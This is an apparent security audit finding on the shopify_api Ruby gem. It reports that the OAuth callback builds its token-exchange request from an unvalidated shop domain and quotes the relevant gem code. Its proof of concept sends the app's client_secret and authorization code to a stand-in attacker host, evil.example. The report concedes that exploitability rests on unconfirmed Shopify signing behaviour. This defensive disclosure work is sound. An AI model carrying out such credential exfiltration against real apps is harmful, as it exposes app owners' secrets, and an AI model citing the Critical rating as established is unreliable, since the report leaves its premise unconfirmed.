Confirmed: `ShopValidator` is used in `token_exchange.rb`, `client_credentials.rb`, `refresh_token.rb`, and the storefront GraphQL client to sanitize/reject untrusted shop domains before making outbound requests, but `lib/shopify_api/auth/oauth.rb` (`begin_auth` and `validate_auth_callback`) never calls `ShopValidator`. This is a genuine identity-binding gap in the classic (authorization-code) OAuth flow.

### Title
OAuth callback trusts unvalidated `shop` domain, allowing exfiltration of `client_secret` and authorization code to an attacker-controlled host - ([File: lib/shopify_api/auth/oauth.rb])

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` builds the token-exchange request URL from `auth_query.shop` without ever checking that the value is a genuine `*.myshopify.com` (or other trusted Shopify) domain, unlike every other OAuth-adjacent code path in this gem.

### Finding Description
`validate_auth_callback` verifies the HMAC over the query params (`code, host, shop, state, timestamp`) via `Utils::HmacValidator.validate(auth_query)` [1](#0-0) , and the `shop` field is indeed part of the signed payload in `AuthQuery#to_signable_string` [2](#0-1) . However, the HMAC signature over the callback query string is produced by *Shopify's own redirect*, using the app's shared `client_secret`. Verifying that HMAC only proves "this query string was signed by whoever holds `client_secret`" — it does not, by itself, restrict `shop` to be `*.myshopify.com`; `shop` is merely one of the parameters covered by the signature, and the app never checks it belongs to `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

Right after the HMAC check, `auth_query.shop` is used directly to build the null session and to construct the token exchange base URI: [3](#0-2) 

`Session.new(shop: auth_query.shop)` feeds into `Clients::HttpClient.new(session: null_session, ...)`, which ultimately issues `POST https://#{shop}/admin/oauth/access_token` carrying `client_id`, `client_secret`, and the authorization `code` in the body. Compare this with `auth_base_uri`, which literally interpolates `shop` into a URL with no allow-list check: [4](#0-3) 

Every sibling credential-issuing flow in this gem enforces the trusted-domain invariant before contacting a host: `Auth::ClientCredentials`, `Auth::RefreshToken`, `Auth::TokenExchange`, and `Clients::Graphql::Storefront` all call `Utils::ShopValidator.sanitize!` (see grep matches in `lib/shopify_api/auth/{token_exchange,client_credentials,refresh_token}.rb` and `lib/shopify_api/clients/graphql/storefront.rb`), and `ShopValidator` explicitly documents its purpose as rejecting attacker-controlled domains: [5](#0-4)  and [6](#0-5) . `oauth.rb` is the one flow that omits this check even though it is the flow that actually sends `client_secret` over the wire to a host derived from user/attacker-influenced input.

The binding that should hold is: **`shop` value used to select the token-exchange host == a value drawn from `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`**. Because `validate_auth_callback`/`auth_base_uri` never enforce this, the equality collapses to: **`shop` used for outbound request == whatever string arrives in the callback query**, regardless of trust.

### Impact Explanation
This is High/Critical: if a merchant/host application is talked into completing an OAuth callback where the query's `shop` parameter is not otherwise constrained by the host app (many Rails/Sinatra examples pass the raw `params[:shop]`/`params.merge` from the request straight into `AuthQuery.new` and `validate_auth_callback`, mirroring `docs/usage/oauth.md`), the gem itself will POST the app's `client_id`, `client_secret`, and a valid authorization `code` to `https://<attacker-domain>/admin/oauth/access_token`. That leaks the app's `client_secret` to the attacker — a Critical-severity credential-exfiltration outcome per the scope rules (theft of the app's `client_secret`).

### Likelihood Explanation
Likelihood depends on whether the host application validates `shop` before calling `validate_auth_callback`. The official docs for this gem (`docs/usage/oauth.md`) do not show the host explicitly re-validating `shop` against `ShopValidator` before calling `validate_auth_callback` — they rely on the gem's own validation, which is absent here, unlike in `TokenExchange`/`ClientCredentials`/`RefreshToken`. Because Shopify's real OAuth redirect always sends a legitimate HMAC computed over the real `shop`, exploiting this specifically requires an attacker to get a validly signed callback delivered with a non-Shopify `shop` value (e.g., by intercepting/replaying a redirect, or if a malicious "app installation" flow lets the attacker choose the `shop` parameter that is echoed back and then HMAC-signed by Shopify for a `shop` value it doesn't validate as `*.myshopify.com` itself). This nuance means exploitability is likely but not unconditionally trivial without confirming Shopify's own HMAC-signing behavior on the redirect for non-myshopify `shop` values.

### Recommendation
Call `Utils::ShopValidator.sanitize!(auth_query.shop)` (or equivalent) immediately after the HMAC check in `validate_auth_callback`, before constructing `null_session`/`auth_base_uri`, and apply the same check to `shop` in `begin_auth` before calling `auth_base_uri`, mirroring the pattern already used in `Auth::TokenExchange`, `Auth::ClientCredentials`, and `Auth::RefreshToken`.

### Proof of Concept
1. Host app's OAuth callback route builds `AuthQuery.new(code:, shop: params[:shop], timestamp:, state:, host:, hmac: params[:hmac])` directly from request params (as illustrated in `docs/usage/oauth.md`) and calls `ShopifyAPI::Auth::Oauth.validate_auth_callback(cookies:, auth_query:)`.
2. An attacker manipulates or replays a callback so that `shop` is set to an attacker-controlled value (e.g., `evil.example`) while keeping a valid `hmac` (obtainable through Shopify's own signed redirect for a scenario where Shopify does not itself constrain `shop` to `*.myshopify.com` before signing, or via any host-side logic that forwards attacker input into the signed callback).
3. `Utils::HmacValidator.validate(auth_query)` passes because `shop=evil.example` was part of the signed string.
4. `Clients::HttpClient.new(session: Session.new(shop: "evil.example"))` issues `POST https://evil.example/admin/oauth/access_token` with `client_id`, `client_secret`, and `code` in the body — see [7](#0-6) , giving the attacker the app's `client_secret`.

### Citations

**File:** lib/shopify_api/auth/oauth.rb (L60-64)
```ruby
        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
```

**File:** lib/shopify_api/auth/oauth.rb (L73-94)
```ruby
          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end
```

**File:** lib/shopify_api/auth/oauth.rb (L117-128)
```ruby
        sig { params(shop: String).returns(String) }
        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")

          # For first-party apps in development only, we leverage DevServer to build the admin base URI
          admin_web = T.unsafe(Object.const_get("DevServer")) # rubocop:disable Sorbet/ConstantsFromStrings
            .new("admin-web")
          admin_host = admin_web.host!(nonstandard_host_prefix: "admin")
          shop_name = shop.split(".").first

          "https://#{admin_host}/store/#{shop_name}"
        end
```

**File:** lib/shopify_api/auth/oauth/auth_query.rb (L33-43)
```ruby
        sig { override.returns(String) }
        def to_signable_string
          params = {
            code: code,
            host: host,
            shop: shop,
            state: state,
            timestamp: timestamp,
          }
          URI.encode_www_form(params)
        end
```

**File:** lib/shopify_api/utils/shop_validator.rb (L6-18)
```ruby
module ShopifyAPI
  module Utils
    module ShopValidator
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )
```

**File:** test/utils/shop_validator_test.rb (L38-42)
```ruby
      def test_rejects_attacker_controlled_domain
        assert_raises(ShopifyAPI::Errors::InvalidShopError) do
          ShopifyAPI::Utils::ShopValidator.sanitize!("attacker.example")
        end
      end
```
